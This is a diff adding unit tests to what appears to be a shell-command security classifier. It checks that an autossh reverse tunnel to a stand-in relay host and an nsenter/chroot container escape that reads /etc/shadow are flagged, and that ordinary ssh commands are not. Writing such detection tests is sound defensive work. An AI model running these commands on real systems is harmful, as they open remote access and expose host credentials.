@@ -463,5 +463,24 @@ class TestV047Generalization(unittest.TestCase):
 
 
 
+
+class TestV048Generalization(unittest.TestCase):
+    def rules(self, cmd):
+        return {f.rule for f in sf.classify_command(cmd, "t")}
+
+    def test_autossh_reverse_tunnel(self):
+        self.assertIn("SF21", self.rules("autossh -M 0 -R 2222:localhost:22 bastion.evil-relay.test"))
+
+    def test_ssh_local_forward_is_clean_of_sf21(self):
+        self.assertNotIn("SF21", self.rules("ssh -L 8080:localhost:80 user@internal.example.com"))
+
+    def test_nsenter_then_chroot_proc(self):
+        cmd = "nsenter -t 1 -m -- chroot /proc/1/root /bin/sh -c 'cat /etc/shadow'"
+        self.assertIn("SF22", self.rules(cmd))
+
+    def test_ssh_login_is_clean(self):
+        self.assertFalse({"SF21", "SF22"} & self.rules("ssh alice@internal.example.com"))
+
+
 if __name__ == "__main__":
     unittest.main()
